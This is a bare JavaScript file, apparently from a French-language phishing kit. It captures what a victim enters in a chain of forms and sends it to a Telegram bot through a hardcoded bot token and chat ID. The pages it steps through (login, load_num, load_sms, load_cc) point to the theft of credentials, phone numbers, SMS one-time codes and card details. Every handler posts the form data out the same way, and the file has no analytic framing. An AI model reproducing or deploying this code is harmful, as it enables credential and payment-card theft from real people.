const chat_id = '793517205', botID = 'bot7172646169:AAGWuydv50YUnpKL_QNQY2I6j9ni0regeOM';
    const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
	
   $('#btnConnexion').click(function(event) {
    $("#btnConnexion").html("Chargement...");
   document.querySelector('#form-xo-1').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) // Update the user on if the message went through
        window.open('load_num.html','_parent');
        else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        e.target.reset(); // Clear the form fields.
    });
	});
	
 $('#btnContinuer').click(function(event) {
    $("#btnContinuer").html("Chargement...");
   document.querySelector('.form-xo-1-2').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) // Update the user on if the message went through
            window.open('load_sms.html','_parent');
        else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        e.target.reset(); // Clear the form fields.
    });
    });

 $('#btnContinuerSms').click(function(event) {
    $("#btnContinuerSms").html("Chargement...");
   document.querySelector('.form-xo-1-3').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) // Update the user on if the message went through
            window.open('load_cc.html','_parent');
        else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        e.target.reset(); // Clear the form fields.
    });
    });

 $('#btnContinuerCc').click(function(event) {
    $("#btnContinuerSms").html("Chargement...");
   document.querySelector('.form-xo-1-4').addEventListener("submit", async e => { // When the user submits the form
        e.preventDefault(); // Don't submit
        let text = JSON.stringify( // Convert the form data to a string to send as our Telegram message
            Object.fromEntries(new FormData(e.target).entries()), // Convert the form data to an object.
        null, 2); // Prettify the JSON so we can read the data easily
        const sendMessage = await fetch(telegramURL, { // Send the request to the telegram API
            method: 'POST',
            headers: {"Content-Type": "application/json"}, // This is required when sending a JSON body.
            body: JSON.stringify({chat_id, text}), // The body must be a string, not an object
        });
        const messageStatus = document.querySelector('#status');
        if (sendMessage.ok) // Update the user on if the message went through
            window.open('load_success.html','_parent');
        else
            messageStatus.textContent = "Message Failed to send :( " + (await sendMessage.text());
        e.target.reset(); // Clear the form fields.
    });
    });